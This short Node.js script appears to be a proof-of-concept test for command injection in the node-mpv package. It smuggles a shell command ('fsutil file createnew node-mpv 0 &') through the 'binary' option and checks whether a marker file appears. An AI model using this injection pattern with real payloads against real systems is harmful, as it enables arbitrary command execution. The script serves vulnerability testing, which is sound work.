Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const Root = require('node-mpv');
const fs = require('fs');
const path = './node-mpv';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
var options = { binary: '"fsutil file createnew node-mpv 0 &"' };
try {
    var root = new Root(options);
} catch (error) {
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + true + ' }');
fs.unlink(path, function (err) {
});